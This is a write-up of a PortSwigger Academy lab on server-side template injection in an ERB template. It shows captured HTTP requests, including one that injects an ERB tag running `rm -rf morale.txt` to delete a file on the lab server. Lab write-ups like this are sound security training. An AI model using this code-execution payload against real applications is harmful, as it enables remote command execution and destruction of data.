---
title: "PortSwigger Academy — Basic server-side template injection (Web) Walkthrough"
---
# Basic server-side template injection

```
❓

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
```

Upon clicking the first View details button for the first product, the message “Unfortunately this product is out of stock” appears above the store item. 

![image-01.png](image-01.png)

```txt
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0a5500690326c0a380ab219000fd002b.web-security-academy.net
Cookie: session=ejJ2GwLiKyOnYNgxuAGJWmsJRXKKNR3I
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a5500690326c0a380ab219000fd002b.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

We are given the hint that the template being used is ERB (Embedded Ruby). After doing some research, we now know that ERB templates use `<%= %>` or `<% %>` to execute Ruby code. Using this knowledge we can pass the command `rm -rf` to delete the file `morale.txt` as shown below. This will then complete the lab 

```txt
GET /?message=<%= `rm -rf morale.txt` %> HTTP/2
Host: 0a5500690326c0a380ab219000fd002b.web-security-academy.net
Cookie: session=ejJ2GwLiKyOnYNgxuAGJWmsJRXKKNR3I
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a5500690326c0a380ab219000fd002b.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
